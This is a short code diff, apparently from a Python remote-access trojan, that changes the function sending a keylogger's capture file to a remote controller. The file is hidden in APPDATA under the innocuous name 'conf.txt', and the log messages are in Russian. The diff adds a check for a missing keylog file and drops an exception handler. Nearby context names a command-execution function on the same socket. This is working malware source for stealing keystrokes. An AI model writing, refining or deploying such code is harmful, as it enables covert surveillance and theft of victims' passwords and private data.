@@ -162,6 +162,11 @@ def execute_command(sock, command):
 def send_keylog_file(sock):
     try:
         keylogger_path = os.path.join(os.environ["APPDATA"], "conf.txt")
+        if not os.path.exists(keylogger_path):
+            logging.warning("[!!] Файл кейлогера отсутствует")
+            reliable_send("[!!] Файл кейлогера отсутствует", sock)
+            return
+        
         with open(keylogger_path, "r") as file:
             logs = file.read().strip()
             if logs:
@@ -173,9 +178,6 @@ def send_keylog_file(sock):
             else:
                 reliable_send("[!!] Кейлог пуст", sock)
                 logging.warning("[!!] Кейлог пуст")
-    except FileNotFoundError:
-        reliable_send("[!!] Файл кейлогера не найден", sock)
-        logging.error("[!!] Файл кейлогера не найден")
     except Exception as e:
         reliable_send(f"[!!] Ошибка при отправке кейлогов: {e}", sock)
         logging.error(f"[!!] Ошибка при отправке кейлогов: {e}")
